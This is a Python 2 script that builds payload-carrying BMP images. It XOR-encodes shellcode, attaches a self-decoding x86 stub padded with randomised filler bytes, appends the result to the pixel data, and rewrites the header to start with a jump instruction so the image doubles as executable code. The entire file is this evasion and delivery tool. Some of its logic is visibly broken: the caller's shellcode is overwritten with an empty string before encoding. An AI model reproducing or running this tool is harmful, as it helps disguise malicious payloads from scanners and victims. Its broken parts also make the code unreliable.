import struct
import random
import time
import os
import re
    
def generate_shellcode(shellcode, output, image_path):
    image = {}
    decoder = "\xeb\x44\x58\x68[RAND1]\x31\xc9\x89\xcb\x6a\x04\x5a\x68[RAND2]\xff\x30\x59\x0f\xc9\x43\x31\xd9\x81\xf9[MAGIC]\x68[RAND3]\x75\xea\x0f\xcb\xb9[SIZE/4]\x01\xd0\x31\x18\x68[RAND4]\xe2\xf4\x2d[SIZE]\xff\xe0\xe8\xb7\xff\xff\xff"
    data = get_file_data(image_path)
    success = False
    if data:
        header, data = parse_image(data)
        image["header"] = header
        image["data"] = data
        image["width"] = header[18:22]
        image["height"] = header[22:26]
                    
        width = struct.unpack("<i", image["width"])[0]
        height = struct.unpack("<i", image["height"])[0]
        shellcode = ""
        shellcode = gen_shellcode(shellcode, decoder)
        
        if shellcode:
            new_header = edit_bmp_header(len(image["header"]) + len(image["data"]), len(shellcode))
            image["header"] = new_header + image["header"][7:]
            image["data"] = image["data"][:(len(shellcode)) * -1] + shellcode
            image["header"] = adjust_height(image["header"], image["height"])
            save_image(image["header"] + image["data"], output)
            success = True
    return success
    
def get_file_data(source):
    data = ""
    path = os.getcwd()
    if os.path.exists(source):
        data = open(source, "rb").read()
    elif os.path.exists(path + "/" + source):
        data = open(path + "/" + source, "rb").read()
    
    if data == "":
        print "%s not found" % source
        return False
    return data

def parse_image(data):
    header = data[:26]
    data = data[(len(data) - 26) * -1:]
    return header,data

def gen_shellcode(shellcode, decoder):
    shellcode = shellcode.replace("\r", "").replace("\n", "")
    try:
        key = gen_key()
        shellcode = pad_shellcode(shellcode)
        magic = gen_magic()
        shellcode = hex(magic)[2:10].decode("hex") + shellcode
        shellcode = xor_payload(shellcode, key)
        size = len(shellcode)
        shellcode = set_decoder(decoder, hex(magic)[2:10].decode("hex"), (size - 4)) + shellcode
        for i in range(1, 5):
            shellcode = shellcode.replace("[RAND" + str(i) + "]", gen_pop(hex(gen_magic())[2:10].decode("hex")))
        return shellcode
    except:
        print "Something when wrong during the obfuscation. Wrong shellcode format?"
        return False
        
def gen_key():
    xor_key = random.randrange(0x11111111, 0x55555555)
    if not hex(xor_key).find("00") == -1:
        gen_key()
    return hex(xor_key)[2:10].decode("hex")

def gen_magic():
    return random.randrange(0x11111111, 0xffffffff)

def pad_shellcode(shellcode):
    shellcode = shellcode.replace("\\x", "").decode("hex")
    padding = (len(shellcode)) % 4
    shellcode = shellcode + "\x90" * (4 - padding)
    return shellcode

def xor_payload(shellcode, key):
    # j is starting at position 1 instead of 0 (bswap)
    final = ""
    j = 0
    for i in range(0, len(shellcode)):
        j += 1
        if j == 4:
            j = 0
        byte = hex(ord(shellcode[i]) ^ ord(key[j]))[2:]
        if len(byte) < 2:
            byte = "0" + byte
        final += byte.decode("hex")
    
    return final

def set_decoder(decoder, magic, size):
    size4 = ("0" * (8 - len(hex(size / 4)[2:])) + hex(size / 4)[2:]).decode("hex")[::-1]
    size = ("0" * (8 - len(hex(size - 4)[2:])) + hex(size - 4)[2:]).decode("hex")[::-1]
    return decoder.replace("[MAGIC]", magic[::-1]).replace("[SIZE/4]", size4).replace("[SIZE]", size)

def gen_pop(data):
    pops = ["\x5f", "\x5e"]
    return data + pops[random.randint(0, len(pops) - 1)]

def edit_bmp_header(size, shellcode_size):
    jmp = hex(size - shellcode_size - 7)[2:]
    jmp = "0" * (8 - len(jmp)) + jmp
    jmp = jmp.decode("hex")[::-1]
    bmp_header = "BM\xe9" + jmp
    return bmp_header

def adjust_height(header, current):
    size = struct.unpack("<i", current)[0] - 5
    size = ("0" * (8 - len(hex(size)[2:])) + hex(size)[2:]).decode("hex")[::-1]
    header = header[:-4] + size
    return header

def save_image(data, path):
    if not path[:1] == "/":
        path = os.getcwd() + "/" + path
    try:    
        open(path, "wb").write(data)
        print "Successfully saved the image. (%s)" % path
    except:
        print "Failed to save the image. (%s)" % path
